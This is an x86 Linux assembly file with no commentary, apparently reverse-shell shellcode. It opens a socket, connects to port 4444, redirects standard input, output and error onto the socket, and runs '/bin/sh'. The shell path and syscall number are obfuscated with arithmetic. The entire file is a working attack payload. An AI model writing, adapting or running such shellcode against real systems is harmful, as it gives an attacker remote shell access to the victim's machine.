section .text

global _start:

_start:
	xor eax,eax
	push eax
	push eax
	push eax
	push eax
	pop ebx
	pop ecx
	pop ecx
	pop edi

	mov al,102
	mov bl,1
	push edi
	push 0x1
	mov dword[esp-4],0x2
	sub esp,4
	mov ecx,esp
	int 80h		; socket()

	mov edx,eax
	
	push edi	
	push edi
	push edi
	mov word[esp-2],0x5c11
	mov word[esp-4],0x2
	sub esp,4
	mov ecx,esp
	
	push 16
	push ecx
	push edx	
	mov ecx,esp
	mov al,102	
	mov bl,3
	int 80h

	xor ecx,ecx
	mov cl,2

dup2:
	mov al,63
	mov ebx,edx
	int 80h

	dec ecx
	jns dup2

	inc ecx
	push ecx
	push 0x68732f6e
	mov dword[esp-4],0x58511e1e
	add dword[esp-4],0x11111111
	sub esp,4
	mov ebx,esp
	xor edx,edx
	mov al,99
	sub al,88
	int 80h
